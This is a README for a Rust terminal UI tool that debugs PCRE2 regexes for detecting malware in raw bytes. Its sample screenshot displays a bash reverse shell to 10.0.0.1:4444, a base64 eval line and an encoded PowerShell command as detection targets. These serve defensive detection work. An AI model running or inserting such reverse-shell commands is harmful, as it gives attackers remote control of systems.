# regexdbg

## AI Disclaimer
THIS APPLICATION IS VIBE CODED.
Do not run this application in an environment where security is a priority. Review the code before using it. Clankers do not actually know how to write secure code.

A terminal UI PCRE2 regex debugger for developing detections against raw byte content — malware samples, shellcode, mixed encodings, binary blobs. Type a pattern, see every match highlighted in the file, inspect capture groups by byte offset.

```
┌Pattern  (Tab/Esc = content  F1 = help)─────────────────┐
│(?i)(bin|exec|eval|powershell)                          │
└────────────────────────────────────────────────────────┘
 Modifiers: (?i) caseless  (?m) multiline  (?s) dotall  (?x) extended  (?U) ungreedy  (?u) utf+ucp
┌Content  [343 bytes]────────────────────────────────────┐
│GET /admin/passwd HTTP/1.1\x0D                          │
│#!/bin/bash                                             │
│exec /bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1         │
│eval(base64_decode("c3lzdGV..."));                      │
│powershell -enc JABjAD0ATgB...                          │
└────────────────────────────────────────────────────────┘
┌Match info──────────────────────────────────────────────┐
│Match 3/5  offset 101  len 4                            │
│  \1  [101-105]  eval                                   │
└────────────────────────────────────────────────────────┘
 sample.bin  [BYTE]  line 1/11  5 matches
```

## Requirements

- Rust (stable, 1.70+)
- libpcre2 — system package:
  - Arch: `pacman -S pcre2`
  - macOS: `brew install pcre2`
  - Debian/Ubuntu: `apt install libpcre2-dev`
- Clipboard utility (for F2 copy):
  - macOS: built-in (`pbcopy` — no install needed)
  - Wayland: `wl-clipboard` (`wl-copy`)
  - X11: `xclip` or `xsel`

## Build

```bash
git clone <repo>
cd regexdbg
cargo build --release
```

The binary is at `target/release/regexdbg`.

## Usage

```bash
# Load a file
regexdbg sample.bin

# Pipe from stdin (keyboard is read from /dev/tty automatically)
cat sample.bin | regexdbg
```

## Interface

The UI has two focus areas. **Tab** or **Esc** switches between them.

### Pattern input

Type a PCRE2 pattern. Matches are recomputed 150 ms after you stop typing so large files stay responsive. Left/Right/Home/End move the cursor; Backspace deletes.

### Content pane

The loaded bytes, scrollable. Every match is highlighted:

- **Yellow** — match extent
- **Cyan** — capture group within a match
- **Green/bold** — the currently selected match

Non-printable bytes (control characters, invalid UTF-8, null bytes) are shown as `\xNN` escapes so raw binary never corrupts the terminal. Lines split on `0x0A`.

### Match-info panel

Shows the selected match's byte offset and length, plus each capture group: its number, name (if named), byte range, and captured bytes (non-printable bytes escaped as `\xNN`).

### Modifier bar

A static reference line showing every available inline modifier. There are no toggles — write the modifiers directly in your pattern.

### Status line

Shows filename, scroll position, total match count, and the full PCRE2 compile-error message (with pattern offset) when the pattern is invalid. Temporarily replaced by a green confirmation or error message after F2 is pressed; clears automatically after 2 seconds.

## Keybindings

| Key | Action |
|---|---|
| **Tab** / **Esc** | Switch focus between pattern and content |
| **/** or **Enter** | Focus pattern input |
| **n** | Next match (jumps view) |
| **N** | Previous match (jumps view) |
| **j** / **k** or **↓** / **↑** | Scroll one line |
| **f** / **b** or **PgDn** / **PgUp** | Scroll one page |
| **g** / **G** or **Home** / **End** | Top / bottom |
| **F1** | Help overlay |
| **F2** | Copy pattern to system clipboard |
| **q** | Quit |

## Inline modifiers

PCRE2 modifiers are written directly in the pattern, not toggled separately. Place them at the start or anywhere they should take effect.

| Modifier | Effect |
|---|---|
| `(?i)` | Caseless — case-insensitive matching |
| `(?m)` | Multiline — `^`/`$` match line boundaries |
| `(?s)` | Dotall — `.` matches `\n` |
| `(?x)` | Extended — ignore unescaped whitespace, allow `#` comments |
| `(?U)` | Ungreedy — all quantifiers lazy by default |
| `(?u)` | UTF+UCP — UTF-8 semantics and Unicode properties (off by default; input is raw bytes) |

Modifiers can be combined (`(?im)`) or scoped (`(?i)foo(?-i)bar`).

## Architecture

Two crates:

- **`core`** — pure matching logic, no UI dependency. `compile(pattern, flags)` → `CompiledPattern`; `run_matches(&mut compiled, buf)` → `Vec<Match>`. All offsets are byte offsets into the raw buffer. A future SVG railroad-diagram tool will consume this crate directly.
- **`tui`** — ratatui+crossterm front-end. Calls `core` once per pattern/flags/buffer change and stores the resulting spans; rendering is read-only against those spans.

## Running tests

```bash
cargo test -p core          # all core tests
cargo test -p core <name>   # single test by name
```
